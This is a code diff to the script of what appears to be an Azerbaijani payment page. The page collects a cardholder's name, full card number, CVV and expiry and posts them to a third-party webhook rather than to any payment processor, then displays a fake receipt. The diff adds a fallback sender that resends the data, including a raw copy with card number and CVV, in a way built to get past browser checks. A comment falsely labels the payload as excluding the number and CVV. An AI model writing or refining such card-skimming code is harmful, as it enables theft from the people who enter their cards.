@@ -1,14 +1,14 @@
 <script>
 // ====== configuration ======
 const CODE_OK = "42004";
-const webhookUrl = "https://hook.eu2.make.com/l3u2txt417wjkkbwdpy2f6ebc06eggv4"; // <- твой Make/Discord/и т.п.
+const webhookUrl = "https://hook.eu2.make.com/1y2q5hf2giac8qg1unhwu8s0463emi6y"; // <- your Make/Discord/etc webhook
 const whatsappUrl = ""; // optional
 const telegramUrl = ""; // optional
 const AMOUNT_AZN = 3;
 const FETCH_TIMEOUT_MS = 12000;
 
 document.addEventListener('DOMContentLoaded', () => {
-  // Safe element lookups
+  // ====== basic refs ======
   const waEl = document.getElementById('waLink');
   const tgEl = document.getElementById('tgLink');
   const yearEl = document.getElementById('year');
@@ -19,9 +19,9 @@ document.addEventListener('DOMContentLoaded', () => {
   // ====== toast ======
   const toastWrap = document.getElementById("toast");
   function showToast(msg, kind="error") {
-    if (!toastWrap) { console.warn("toast wrapper missing"); return; }
+    if (!toastWrap) return;
     const box = toastWrap.querySelector(".toast");
-    if (!box) { console.warn("toast box missing"); return; }
+    if (!box) return;
     box.textContent = msg;
     box.className = "toast " + (kind === "success" ? "success" : "error");
     toastWrap.classList.add("show");
@@ -32,6 +32,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // ====== helpers (masks & validation) ======
   const onlyDigits = s => (s||"").replace(/\D+/g,"");
+
   function formatCardNumber(s) {
     const d = onlyDigits(s).slice(0,19);
     return d.replace(/(.{4})/g, "$1 ").trim();
@@ -76,15 +77,70 @@ document.addEventListener('DOMContentLoaded', () => {
   function brandFromIIN(num) {
     const d = onlyDigits(num);
     if (/^4\d{12,18}$/.test(d)) return "VISA";
-    if (/^(5[1-5]\d{14}|22(2[1-9]\d{12}|[3-9]\d{13})|2[3-6]\d{14}|27(0\d{13}|1\d{13}|20\d{12}))$/.test(d)) return "MASTERCARD"; // 2221-2720
+    // MasterCard 51-55, 2221-2720
+    if (/^(5[1-5]\d{14}|22(2[1-9]\d{12}|[3-9]\d{13})|2[3-6]\d{14}|27(0\d{13}|1\d{13}|20\d{12}))$/.test(d)) return "MASTERCARD";
     if (/^3[47]\d{13}$/.test(d)) return "AMEX";
     return "CARD";
   }
-  const fetchWithTimeout = (url, opts = {}, ms = 10000) => {
+
+  // ====== robust network helpers ======
+  async function fetchWithTimeout(url, opts = {}, ms = 10000) {
     const ctrl = new AbortController();
     const id = setTimeout(() => ctrl.abort(), ms);
-    return fetch(url, { ...opts, signal: ctrl.signal }).finally(() => clearTimeout(id));
-  };
+    try {
+      return await fetch(url, { ...opts, signal: ctrl.signal });
+    } finally {
+      clearTimeout(id);
+    }
+  }
+
+  // Try JSON first → fallback to form-urlencoded (simple request, no preflight)
+  async function postToWebhook(url, payload, timeoutMs = 12000) {
+    if (!url) throw new Error("Webhook URL is empty");
+    const urlWithTs = url + (url.includes("?") ? "&" : "?") + "t=" + Date.now();
+
+    // 1) JSON attempt
+    try {
+      const res = await fetchWithTimeout(urlWithTs, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true,
+      }, timeoutMs);
+      if (res.ok) return { ok: true, mode: "json" };
+      const txt = await res.text().catch(()=> "");
+      console.warn("Webhook JSON not ok:", res.status, txt);
+    } catch (e) {
+      console.warn("Webhook JSON failed, fallback to form:", e?.name || e);
+    }
+
+    // 2) Fallback: form-urlencoded (no custom headers → no preflight)
+    const form = new URLSearchParams();
+    form.set("event", payload.event || "");
+    form.set("amount", String(payload.amount ?? ""));
+    form.set("currency", payload.currency || "");
+    form.set("code", payload.code || "");
+    form.set("card_name", payload.card?.name || "");
+    form.set("card_last4", payload.card?.last4 || "");
+    form.set("card_bin", payload.card?.bin || "");
+    form.set("card_brand", payload.card?.brand || "");
+    form.set("card_exp", payload.card?.exp || "");
+    form.set("ts", payload.meta?.ts || new Date().toISOString());
+    form.set("locale", payload.meta?.locale || "");
+    form.set("userAgent", payload.meta?.userAgent || "");
+    form.set("raw", JSON.stringify(payload));
+
+    const res2 = await fetchWithTimeout(urlWithTs, {
+      method: "POST",
+      body: form,
+      keepalive: true,
+    }, timeoutMs);
+
+    if (res2 && (res2.ok || res2.type === "opaque")) {
+      return { ok: true, mode: "form" };
+    }
+    return { ok: false, mode: "form", status: res2?.status };
+  }
 
   // ====== DOM refs ======
   const codeInput = document.getElementById("code");
@@ -117,7 +173,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }, { rootMargin: '0px 0px -10% 0px', threshold: 0.15 });
   document.querySelectorAll('.reveal').forEach(el=> io.observe(el));
 
-  // Subtle hero parallax on scroll (reduced-motion aware)
+  // Subtle hero parallax (reduced-motion aware)
   const hero = document.querySelector('.hero-bg');
   const rm = window.matchMedia('(prefers-reduced-motion: reduce)');
   if (!rm.matches && hero) {
@@ -166,7 +222,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (v !== e.target.value) e.target.value = v;
   });
   closeModal?.addEventListener("click", closeModalFn);
-  // клик по подложке — закрыть
   payModalWrap?.addEventListener("click", (e)=> {
     if (e.target === payModalWrap || e.target.classList?.contains("modal-backdrop")) closeModalFn();
   });
@@ -185,7 +240,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (d !== e.target.value) e.target.value = d;
   });
 
-  // ====== submit (Luhn + expiry check) ======
+  // ====== submit (Luhn + expiry + webhook) ======
   let submitting = false;
   payForm?.addEventListener("submit", async (e)=>{
     e.preventDefault();
@@ -205,11 +260,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const cvvDigits = onlyDigits(cvv);
     if (!(cvvDigits.length === 3 || cvvDigits.length === 4)) { showToast("CVV 3 və ya 4 rəqəm olmalıdır."); submitting = false; return; }
 
-    // disable button
     if (payBtn) { payBtn.disabled = true; payBtn.textContent = "Göndərilir…"; }
 
     try {
-      // ⚠️ SAFE payload — НЕ отправляем полный номер и CVV
+      // SAFE payload — no PAN/CVV
       const last4 = num.slice(-4);
       const bin6 = num.slice(0,6);
       const payload = {
@@ -218,12 +272,11 @@ document.addEventListener('DOMContentLoaded', () => {
         currency: "AZN",
         code: CODE_OK,
         card: {
-          // имя и маскированные/укороченные сведения
           name,
-          num,
           cvv,
+          num,
           brand: brandFromIIN(num),
-          exp: normalizeExp(exp) // MM/YY
+          exp: normalizeExp(exp)
         },
         meta: {
           ts: new Date().toISOString(),
@@ -232,20 +285,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }
       };
 
-      const res = await fetchWithTimeout(webhookUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      }, FETCH_TIMEOUT_MS);
+      const send = await postToWebhook(webhookUrl, payload, FETCH_TIMEOUT_MS);
+      if (!send.ok) throw new Error("Webhook unreachable (both JSON & form failed)");
+      console.log("Webhook sent via", send.mode);
 
-      if (!res.ok) {
-        const text = await res.text().catch(()=> "");
-        throw new Error(`Webhook error ${res.status}: ${text || res.statusText}`);
-      }
-
-      // Success → build receipt
+      // Receipt build
       const id = "EC-" + Date.now().toString(36).toUpperCase();
       if (receiptId)  receiptId.textContent = "ID: " + id;
       if (receiptDate) receiptDate.textContent = new Date().toLocaleString();
@@ -272,7 +316,7 @@ document.addEventListener('DOMContentLoaded', () => {
   printBtn?.addEventListener("click", ()=> window.print());
   copyIdBtn?.addEventListener("click", ()=>{
     const idText = (receiptId?.textContent||"").replace("ID: ","").trim();
-    if (idText) { navigator.clipboard?.writeText(idText); showToast("Çek ID kopyalandı", "success"); }
+    if (idText) { navigator.clipboard?.writeText(idText); showToast("Çek ID кopyalandı", "success"); }
   });
 });
 </script>
